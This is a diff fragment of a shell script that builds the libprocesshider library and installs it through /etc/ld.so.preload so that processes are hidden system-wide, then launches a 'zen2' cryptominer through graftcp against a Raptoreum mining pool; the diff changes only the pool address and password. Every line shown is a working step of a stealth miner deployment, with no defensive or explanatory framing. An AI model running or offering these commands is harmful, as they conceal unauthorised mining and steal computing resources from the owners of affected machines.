@@ -46,4 +46,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./zen2 -a gr -o stratum+tcp://raptoreumemporium.com:3008 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz120 -p IhatePopUps --no-tune
+./graftcp/graftcp ./zen2 -a gr -o stratum+tcp://pool.minafacil.com:5555 -u RVu7t5hrxSnWmz3xheHW3NE2PmDAVE5GEM.PetrolAzAz120 -p c=RTM --no-tune
